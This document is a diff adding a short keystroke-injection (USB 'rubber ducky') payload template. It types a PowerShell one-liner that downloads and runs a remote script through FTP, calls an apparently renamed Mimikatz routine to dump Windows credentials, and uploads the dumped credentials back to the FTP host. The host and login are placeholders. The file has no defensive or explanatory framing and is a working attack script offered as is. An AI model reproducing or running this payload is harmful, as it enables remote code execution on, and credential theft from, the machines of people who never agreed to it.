@@ -1,0 +1,6 @@
+>>>CMD<<<
+STRING powershell "$webclient = New-Object System.Net.WebClient;$webclient.Credentials = New-Object System.Net.NetworkCredential('>>>USERNAME<<<', '>>>PASSWORD<<<'); IEX $webclient.DownloadString('ftp://>>>HOST<<</>>>INFILE<<<'); $output = Invoke-Mimidogz -DumpCreds; $out = Get-Random; $webclient.UploadString('ftp://>>>HOST<<</>>>OUTFILE<<< - $out.txt', $output)"
+ENTER
+DELAY 10000
+STRING exit
+ENTER
